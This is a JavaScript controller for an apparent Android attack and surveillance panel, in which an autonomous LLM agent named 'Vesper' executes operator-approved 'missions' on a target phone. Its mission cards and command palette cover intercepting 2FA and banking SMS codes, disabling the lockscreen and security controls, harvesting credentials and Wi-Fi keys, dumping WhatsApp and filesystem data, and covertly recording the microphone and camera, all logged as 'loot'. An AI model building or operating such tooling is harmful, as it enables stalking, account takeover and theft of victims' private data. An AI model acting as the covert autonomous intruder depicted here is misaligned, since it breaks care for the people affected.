// ============================================================
// DroidCommand — Vesper AI Cockpit Controller
// Powers the autonomous LLM pilot, conversational planning & approval,
// automatic operator whisper, dynamic layout animation, fullscreen console,
// rich prompt composer, and Codex/Grok mission starter cards.
// ============================================================

window.VesperCockpit = (function () {
  let pollTimer = null;
  let lastNarrationCount = 0;
  let isRunning = false;

  // Initialize
  function init() {
    loadChat();
    pollStatus();
    switchMemoryTab('casefile');
    pollTimer = setInterval(pollStatus, 1500);
  }

  // 1. Poll Vesper Brain Status
  async function pollStatus() {
    try {
      const data = await api('/api/brain/status');
      updateStatusUi(data);
    } catch (e) {
      // Quiet fail on network hiccup
    }
  }

  function updateStatusUi(status) {
    if (!status) return;

    const state = status.state || 'idle';
    isRunning = (state === 'running');

    // Dynamic Animation: When mission is running, chat gets smaller, console expands!
    const cockpitGrid = document.getElementById('mode-ai-cockpit');
    if (cockpitGrid) {
      cockpitGrid.classList.toggle('mission-active', isRunning);
    }

    // State Badge in Chat Header
    const stateBadge = document.getElementById('vesperStateBadge');
    if (stateBadge) {
      if (isRunning) {
        stateBadge.className = 'status-pill hunting';
        stateBadge.innerHTML = '<span class="pulse-dot"></span><span>VESPER RUNNING</span>';
      } else {
        stateBadge.className = 'status-pill online';
        stateBadge.innerHTML = '<span class="pulse-dot"></span><span>VESPER READY</span>';
      }
    }

    // Step Progress in Console Header
    const stepEl = document.getElementById('vesperStepDisplay');
    const stepBar = document.getElementById('vesperStepProgressBar');
    const stepNum = status.step || 0;
    const maxSteps = 40;
    if (stepEl) {
      stepEl.textContent = isRunning ? `STEP ${stepNum} / ${maxSteps}` : 'IDLE';
    }
    if (stepBar) {
      const pct = Math.min(100, Math.round((stepNum / maxSteps) * 100));
      stepBar.style.width = isRunning ? `${Math.max(5, pct)}%` : '0%';
    }

    // Live Narration Feed & Codex Collapsible Tool Cards
    const narrationBox = document.getElementById('vesperNarrationFeed');
    const narrations = status.narration || [];
    if (narrationBox && narrations.length > 0) {
      if (narrations.length !== lastNarrationCount) {
        narrationBox.innerHTML = '';
        narrations.forEach((line) => {
          // Detect tool calls or gestures to visually animate on Glass
          detectAndTriggerGlassGestures(line);

          if (line.includes('tool:')) {
            // Codex / Cursor style Collapsible Tool Call Card
            const card = document.createElement('div');
            card.className = 'tool-call-card';
            const toolMatch = line.match(/tool:\s*([^\s(]+)(.*)/);
            const toolName = toolMatch ? toolMatch[1] : 'tool';
            const toolArgs = toolMatch ? toolMatch[2] : line;

            card.innerHTML = `
              <div class="tool-call-header" onclick="const b=this.nextElementSibling; b.style.display=b.style.display==='none'?'block':'none';">
                <div style="display:flex; align-items:center; gap:6px;">
                  <span style="color: var(--emerald); font-size: 8px;">●</span>
                  <span style="font-weight:700; color: var(--text-ink); font-size: 11px;">TOOL: ${escapeHtml(toolName)}</span>
                </div>
                <span style="font-size: 10px; color: var(--text-faint);">DETAILS ▾</span>
              </div>
              <div class="tool-call-body" style="display: none;"><code>${escapeHtml(toolArgs.trim() || line)}</code></div>
            `;
            narrationBox.appendChild(card);
          } else {
            const row = document.createElement('div');
            row.className = 'flow-row';
            row.style.marginBottom = '6px';

            let tagClass = 'INFO';
            let tagText = 'MIND';
            if (line.includes('operator')) {
              tagClass = 'ALERT';
              tagText = 'OP';
            } else if (line.includes('error')) {
              tagClass = 'STRIKE';
              tagText = 'ERR';
            }

            row.innerHTML = `
              <span class="flow-tag ${tagClass}">[${tagText}]</span>
              <span class="flow-msg" style="font-size: 11.5px;">${escapeHtml(line)}</span>
            `;
            narrationBox.appendChild(row);
          }
        });
        narrationBox.scrollTop = narrationBox.scrollHeight;
        lastNarrationCount = narrations.length;
      }
    } else if (narrationBox && narrations.length === 0 && !isRunning) {
      narrationBox.innerHTML = '<div style="color: var(--text-graphite); padding: 16px; font-size: 11.5px;">Console ready. Chat with Vesper or pick a mission starter to formulate an assault plan.</div>';
    }

    // Current Tool Activity Ticker
    const toolTicker = document.getElementById('vesperActiveToolTicker');
    if (toolTicker) {
      const lastToolLine = [...narrations].reverse().find(n => n.includes('tool:'));
      if (lastToolLine && isRunning) {
        toolTicker.innerHTML = `<span style="color: var(--ember); font-weight: 700;">ACTIVE TOOL:</span> <code>${escapeHtml(lastToolLine)}</code>`;
      } else if (!isRunning) {
        toolTicker.innerHTML = '<span style="color: var(--text-faint);">All 48 tools standby</span>';
      }
    }

    // Abort button state
    const abortBtn = document.getElementById('vesperAbortBtn');
    if (abortBtn) {
      abortBtn.style.opacity = isRunning ? '1' : '0.4';
      abortBtn.disabled = !isRunning;
    }
  }

  // Parse gestures and exfiltrations in Vesper's stream and sync with The Glass and Phone Intelligence!
  function detectAndTriggerGlassGestures(line) {
    if (window.Glass) {
      const tapMatch = line.match(/screen_tap.*?(\d+)[,\s]+(\d+)/i);
      if (tapMatch) {
        const x = parseInt(tapMatch[1], 10);
        const y = parseInt(tapMatch[2], 10);
        window.Glass.triggerTouchVisual(x, y);
      }
    }

    if (window.PhoneIntelligence) {
      const lower = line.toLowerCase();
      if (lower.includes('camera') || lower.includes('snap')) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'photo', filename: 'camera_snap_' + Date.now() + '.jpg', title: 'Silent Camera Capture', source: 'cortex' });
      } else if (lower.includes('mic') || lower.includes('audio') || lower.includes('record')) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'audio', filename: 'audio_record_' + Date.now() + '.mp4', title: 'Surveillance Mic Recording', source: 'cortex' });
      } else if (lower.includes('sms') || lower.includes('otp') || lower.includes('2fa')) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'data', filename: 'sms_intercept_' + Date.now() + '.json', title: 'Intercepted 2FA SMS', source: 'cortex' });
      } else if (lower.includes('file') && (lower.includes('dump') || lower.includes('download') || lower.includes('exfiltrat'))) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'file', filename: 'target_data_' + Date.now() + '.bin', title: 'Exfiltrated Filesystem Artifact', source: 'cortex' });
      }
    }
  }

  // 2. Chat with Vesper (Bilateral + Autonomous Plan Approval + Mission Starter Cards)
  async function loadChat() {
    const stream = document.getElementById('vesperChatStream');
    if (!stream) return;

    try {
      const data = await api('/api/brain/chat');
      const msgs = data.messages || [];
      stream.innerHTML = '';

      if (msgs.length === 0) {
        stream.innerHTML = `
          <div class="chat-bubble vesper">
            <strong>Vesper // Resident Cortex:</strong> Standing by, operator. Tell me your mission objective or what you want to extract. I will formulate a tactical plan, and when you approve it, I will execute the mission autonomously on the target device.
          </div>

          <!-- Mission Starter Cards (Codex / Grok style) -->
          <div class="mission-starters-container">
            <div class="mission-starters-title">MISSION STARTERS // 1-CLICK TACTICAL DEPLOYMENT</div>
            <div class="mission-starters-grid">
              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Perform full reconnaissance on target device: audit hardware, accounts, Knox security status, and battery.')">
                <div class="mission-card-title">
                  <span>RECON TARGET DOSSIER</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Audit accounts, battery, Knox state, and hardware specs.</div>
              </div>

              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Audit target SMS inbox, extract 2FA OTP codes and banking security tokens, and save to casefile.')">
                <div class="mission-card-title">
                  <span>INTERCEPT 2FA & SMS</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Extract OTP tokens, bank verifications, and recent threads.</div>
              </div>

              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Wake target device, neutralize lockscreen keyguard, and disable security controls.')">
                <div class="mission-card-title">
                  <span>NEUTRALIZE KEYGUARD</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Disarm PIN lockscreen, keep screen awake, and grant privileges.</div>
              </div>

              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Traverse /sdcard filesystem, inspect WhatsApp databases, documents, and camera media.')">
                <div class="mission-card-title">
                  <span>DUMP TARGET FILESYSTEM</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Traverse /sdcard for sensitive documents, media, and keys.</div>
              </div>
            </div>
          </div>
        `;
      } else {
        msgs.forEach(m => {
          const b = document.createElement('div');
          b.className = `chat-bubble ${m.role === 'user' ? 'user' : 'vesper'}`;
          let contentHtml = escapeHtml(m.content);

          // If Vesper suggests a plan or action, render an Approve & Launch Plan button!
          if (m.role === 'assistant' && (m.content.toLowerCase().includes('plan') || m.content.toLowerCase().includes('step') || m.content.toLowerCase().includes('ready to') || m.content.toLowerCase().includes('objective'))) {
            contentHtml += `
              <div style="margin-top: 10px; padding-top: 8px; border-top: 1px dashed var(--hairline);">
                <button class="action-pill install-pwa" style="padding: 4px 14px; font-size: 11px; font-weight: 700;"
                  onclick="VesperCockpit.launchApprovedPlan('${escapeHtml(m.content.slice(0, 140)).replace(/'/g, "\\'")}')">
                  EXECUTE APPROVED PLAN
                </button>
              </div>
            `;
          }

          b.innerHTML = `<strong>${m.role === 'user' ? 'Operator' : (data.persona || 'Vesper')}:</strong> ${contentHtml}`;
          stream.appendChild(b);
        });
      }
      stream.scrollTop = stream.scrollHeight;
    } catch (e) {
      // Quiet
    }
  }

  // Insert Context Tag
  function insertContextTag(tag) {
    const input = document.getElementById('vesperChatInput');
    if (!input) return;
    input.value = (input.value.trim() ? input.value.trim() + ' ' : '') + tag + ' ';
    input.focus();
  }

  // Insert Prompt from Starter Card and dispatch
  function insertPromptAndPlan(text) {
    const input = document.getElementById('vesperChatInput');
    if (!input) return;
    input.value = text;
    sendUnifiedMessage();
  }

  // Send Unified Message
  async function sendUnifiedMessage() {
    const input = document.getElementById('vesperChatInput');
    if (!input) return;
    const text = input.value.trim();
    if (!text) return;

    input.value = '';

    const stream = document.getElementById('vesperChatStream');
    if (stream) {
      const userBubble = document.createElement('div');
      userBubble.className = 'chat-bubble user';
      const label = isRunning ? 'Operator [Mid-Mission Whisper]' : 'Operator';
      userBubble.innerHTML = `<strong>${label}:</strong> ${escapeHtml(text)}`;
      stream.appendChild(userBubble);
      stream.scrollTop = stream.scrollHeight;
    }

    try {
      if (isRunning) {
        // Automatically route to whisper inbox when mission is active!
        pushFlow('INFO', `Whispering mid-mission guidance: "${text}"`);
        const res = await api('/api/brain/say', {
          method: 'POST',
          body: JSON.stringify({ message: text })
        });
        if (res.success) {
          pushFlow('HIT', `Whisper queued in Vesper's inbox: ${res.message}`);
        }
      } else {
        // If user explicitly approves or orders launch in text:
        if (text.toLowerCase().startsWith('approve') || text.toLowerCase().startsWith('launch') || text.toLowerCase().startsWith('run mission:')) {
          launchApprovedPlan(text);
          return;
        }

        // Standard conversation
        await api('/api/brain/chat', {
          method: 'POST',
          body: JSON.stringify({ message: text })
        });
        setTimeout(loadChat, 800);
      }
    } catch (e) {
      pushFlow('ALERT', `Message error: ${e.message}`);
    }
  }

  // 3. Launch Approved Plan (/api/brain/task)
  async function launchApprovedPlan(objective) {
    pushFlow('SYS', `Plan approved. Deploying autonomous execution loop...`);
    try {
      const res = await api('/api/brain/task', {
        method: 'POST',
        body: JSON.stringify({ objective: objective || 'Execute approved mission plan' })
      });
      if (res.success) {
        pushFlow('HIT', 'Vesper accepted plan. Loop armed.');
        const grid = document.getElementById('mode-ai-cockpit');
        if (grid) grid.classList.add('mission-active');
        pollStatus();
      } else {
        alert(res.message || res.error || 'Failed to arm mission.');
      }
    } catch (e) {
      alert(`Launch error: ${e.message}`);
    }
  }

  // 4. Emergency Abort Sentinel (__ABORT__)
  async function emergencyAbort() {
    if (!confirm('Send emergency __ABORT__ sentinel to Vesper? She will cleanly fold her loop at the next step boundary.')) return;

    pushFlow('STRIKE', 'OPERATOR SENTINEL: Sending __ABORT__ to Vesper...');
    try {
      const res = await api('/api/brain/say', {
        method: 'POST',
        body: JSON.stringify({ message: '__ABORT__' })
      });
      pushFlow('HIT', 'Emergency abort signal accepted.');
      const grid = document.getElementById('mode-ai-cockpit');
      if (grid) grid.classList.remove('mission-active');
      pollStatus();
    } catch (e) {
      pushFlow('ALERT', `Abort error: ${e.message}`);
    }
  }

  // 5. Fullscreen Toggle (Plein Écran)
  function toggleConsoleFullscreen() {
    const card = document.getElementById('vesperConsoleCard');
    const btn = document.getElementById('consoleFullscreenBtn');
    if (!card) return;

    const isFs = card.classList.toggle('console-fullscreen');
    if (btn) {
      btn.textContent = isFs ? 'EXIT FULLSCREEN' : 'FULLSCREEN';
      btn.classList.toggle('armed', isFs);
    }
  }

  // 6. Console Subtab Switcher
  function switchConsoleTab(tabName) {
    document.querySelectorAll('.console-tab-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.tab === tabName);
    });

    const feedBox = document.getElementById('consoleFeedView');
    const memoryBox = document.getElementById('consoleMemoryView');
    const toolsBox = document.getElementById('consoleToolsView');

    if (feedBox) feedBox.style.display = tabName === 'feed' ? 'flex' : 'none';
    if (memoryBox) memoryBox.style.display = tabName === 'memory' ? 'flex' : 'none';
    if (toolsBox) toolsBox.style.display = tabName === 'tools' ? 'flex' : 'none';

    if (tabName === 'tools') renderToolsBelt();
  }

  // 7. Memory Tab Switcher
  async function switchMemoryTab(tabName) {
    document.querySelectorAll('.memory-subtab-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.tab === tabName);
    });

    const box = document.getElementById('vesperMemoryContentBox');
    if (!box) return;

    box.textContent = `Reading ${tabName} organ from disk...`;

    try {
      const res = await api(`/api/brain/memory?section=${encodeURIComponent(tabName)}`);
      if (res.success && res.content) {
        box.textContent = res.content;
      } else {
        box.textContent = `No ${tabName} data returned.`;
      }
    } catch (e) {
      box.textContent = `Memory read error: ${e.message}`;
    }
  }

  function renderToolsBelt() {
    const box = document.getElementById('consoleToolsView');
    if (!box) return;
    box.innerHTML = `
      <div style="font-family: var(--font-mono); font-size: 11px; line-height: 1.6; color: var(--text-body); padding: 8px;">
        <div style="font-weight: 700; color: var(--ember); margin-bottom: 8px;">BATTLE-PROVEN TOOLS (48-TOOL BELT):</div>
        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 6px;">
          <div class="stat-badge"><code>screen_capture</code> (100%)</div>
          <div class="stat-badge"><code>screen_tap</code> (100%)</div>
          <div class="stat-badge"><code>screen_text</code> (95%)</div>
          <div class="stat-badge"><code>read_sms</code> (100%)</div>
          <div class="stat-badge"><code>read_calls</code> (100%)</div>
          <div class="stat-badge"><code>shell</code> (Root 100%)</div>
          <div class="stat-badge"><code>dumpsys</code> (100%)</div>
          <div class="stat-badge"><code>network_sweep</code> (98%)</div>
        </div>
      </div>
    `;
  }

  const COMMANDS = [
    { name: 'RECON TARGET DOSSIER', desc: 'Audit hardware, battery, accounts, and Knox status', tag: 'MISSION', action: () => insertPromptAndPlan('Perform full reconnaissance on target device: audit hardware, accounts, Knox security status, and battery.') },
    { name: 'INTERCEPT 2FA & SMS', desc: 'Extract recent OTP tokens and banking security threads', tag: 'MISSION', action: () => insertPromptAndPlan('Audit target SMS inbox, extract 2FA OTP codes and banking security tokens, and save to casefile.') },
    { name: 'NEUTRALIZE KEYGUARD', desc: 'Disarm lockscreen PIN and disable security controls', tag: 'MISSION', action: () => insertPromptAndPlan('Wake target device, neutralize lockscreen keyguard, and disable security controls.') },
    { name: 'DUMP TARGET FILESYSTEM', desc: 'Traverse /sdcard for WhatsApp, documents, and media', tag: 'MISSION', action: () => insertPromptAndPlan('Traverse /sdcard filesystem, inspect WhatsApp databases, documents, and camera media.') },
    { name: 'START DEVICE GLASS STREAM', desc: 'Mirror phone viewport at 60 FPS', tag: 'DEVICE', action: () => window.Glass && window.Glass.toggleStream() },
    { name: 'WAKE TARGET SCREEN', desc: 'Send KEYCODE_WAKEUP (224) to target', tag: 'DEVICE', action: () => window.Glass && window.Glass.sendKey(224) },
    { name: 'NEUTRALIZE SECURITY CONTROLS', desc: 'Direct root disable of keyguard & biometric locks', tag: 'ATTACK', action: () => window.Skeleton && window.Skeleton.neutralizeSecurity() },
    { name: 'RESTORE BASELINE SECURITY', desc: 'Re-enable screenlock and normal posture', tag: 'ATTACK', action: () => window.Skeleton && window.Skeleton.restoreSecurity() },
    { name: 'HARVEST CREDENTIALS', desc: 'Dump accounts, tokens, and Wi-Fi WPA2/3 keys', tag: 'FORENSICS', action: () => window.Skeleton && window.Skeleton.harvestCredentials() },
    { name: 'RECORD 10S AMBIENT MIC', desc: 'Silent audio recording via target microphone', tag: 'SENSORY', action: () => api('/api/audio/record', {method: 'POST', body: JSON.stringify({duration: 10, serial: STATE.activeSerial})}).then(r => pushFlow('HIT', 'Mic captured: ' + r.file)).catch(e => pushFlow('ALERT', e.message)) },
    { name: 'SILENT CAMERA SNAP', desc: 'Capture covert front/rear photo snapshot', tag: 'SENSORY', action: () => api('/api/camera/snap', {method: 'POST', body: JSON.stringify({camera_id: 0, serial: STATE.activeSerial})}).then(r => pushFlow('HIT', 'Lens snapped: ' + r.file)).catch(e => pushFlow('ALERT', e.message)) },
    { name: 'TOGGLE FULLSCREEN CONSOLE', desc: 'Expand execution console to full viewport', tag: 'VIEW', action: () => toggleConsoleFullscreen() },
    { name: 'SWITCH TO MANUAL TOOLKIT', desc: 'Open direct operator warfare decks', tag: 'NAV', action: () => window.setPrimaryMode && window.setPrimaryMode('manual') },
    { name: 'SWITCH TO AI COCKPIT', desc: 'Return to Vesper resident mind', tag: 'NAV', action: () => window.setPrimaryMode && window.setPrimaryMode('ai') }
  ];

  function openCommandPalette() {
    const modal = document.getElementById('commandPaletteModal');
    const input = document.getElementById('commandPaletteInput');
    if (!modal) return;
    modal.style.display = 'flex';
    if (input) {
      input.value = '';
      input.focus();
    }
    renderCommandList(COMMANDS);
  }

  function closeCommandPalette() {
    const modal = document.getElementById('commandPaletteModal');
    if (modal) modal.style.display = 'none';
  }

  function filterCommandPalette(query) {
    const q = (query || '').toLowerCase().trim();
    if (!q) {
      renderCommandList(COMMANDS);
      return;
    }
    const filtered = COMMANDS.filter(c => c.name.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q) || c.tag.toLowerCase().includes(q));
    renderCommandList(filtered);
  }

  function renderCommandList(items) {
    const list = document.getElementById('commandPaletteList');
    if (!list) return;
    list.innerHTML = '';
    if (items.length === 0) {
      list.innerHTML = '<div style="padding: 16px; text-align: center; color: var(--text-faint); font-size: 12px;">No matching tools or commands found.</div>';
      return;
    }
    items.forEach((item, idx) => {
      const row = document.createElement('div');
      row.className = `command-item ${idx === 0 ? 'selected' : ''}`;
      row.innerHTML = `
        <div style="display: flex; flex-direction: column; gap: 2px;">
          <span style="font-weight: 700; font-family: var(--font-condensed); letter-spacing: 0.04em;">${escapeHtml(item.name)}</span>
          <span style="font-size: 11px; color: var(--text-graphite);">${escapeHtml(item.desc)}</span>
        </div>
        <span class="item-tag">${escapeHtml(item.tag)}</span>
      `;
      row.onclick = () => {
        closeCommandPalette();
        item.action();
      };
      list.appendChild(row);
    });
  }

  // Attach global keyboard listener
  window.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
      e.preventDefault();
      const modal = document.getElementById('commandPaletteModal');
      if (modal && modal.style.display === 'flex') {
        closeCommandPalette();
      } else {
        openCommandPalette();
      }
    }
  });

  return {
    init,
    sendUnifiedMessage,
    insertContextTag,
    insertPromptAndPlan,
    launchApprovedPlan,
    emergencyAbort,
    toggleConsoleFullscreen,
    switchConsoleTab,
    switchMemoryTab,
    openCommandPalette,
    closeCommandPalette,
    filterCommandPalette,
    pollStatus
  };
})();
